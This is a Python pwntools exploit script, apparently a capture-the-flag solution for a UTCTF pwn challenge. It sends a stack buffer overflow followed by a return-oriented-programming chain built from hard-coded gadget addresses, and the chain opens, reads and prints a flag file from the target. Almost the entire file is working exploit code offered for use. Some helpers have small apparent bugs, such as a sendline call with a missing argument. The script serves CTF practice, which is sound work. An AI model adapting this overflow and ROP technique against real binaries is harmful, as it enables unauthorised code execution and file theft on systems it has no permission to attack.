#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challenge.utctf.live"
PORT = 5141

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(io,e):
    syscall = 0x44f92a
    pop_rdi = 0x000000000040204f
    pop_rax_rdx_rbx = 0x000000000048630a
    pop_rsi = 0x000000000040a0be
    mov_rdi_rdx = 0x0000000000433a83

    openat_func = 0x047a290

    payload = b"A"*0x88

    # write to mem
    payload += p64(pop_rdi) + p64(e.bss())
    payload += p64(pop_rax_rdx_rbx + 1) + b"./flag.t" + p64(0)
    payload += p64(mov_rdi_rdx)
    payload += p64(pop_rdi) + p64(e.bss() + 8)
    payload += p64(pop_rax_rdx_rbx + 1) + b"xt\x00\x00\x00\x00\x00\x00" + p64(0)
    payload += p64(mov_rdi_rdx)

    # open
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rdi) + p64(e.bss())
    payload += p64(pop_rax_rdx_rbx) + p64(2) + p64(0) + p64(0)
    payload += p64(syscall)
    payload += p64(0xdeadbeef) * 5

    # read
    payload += p64(pop_rdi) + p64(5)
    payload += p64(pop_rsi) + p64(e.bss())
    payload += p64(pop_rax_rdx_rbx) + p64(0) + p64(64) + p64(0)
    payload += p64(syscall)
    payload += p64(0xdeadbeef) * 5

    # write
    payload += p64(pop_rdi) + p64(1)
    payload += p64(pop_rsi) + p64(e.bss())
    payload += p64(pop_rax_rdx_rbx) + p64(1) + p64(64) + p64(0)
    payload += p64(syscall)


    io.sendline(payload)

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
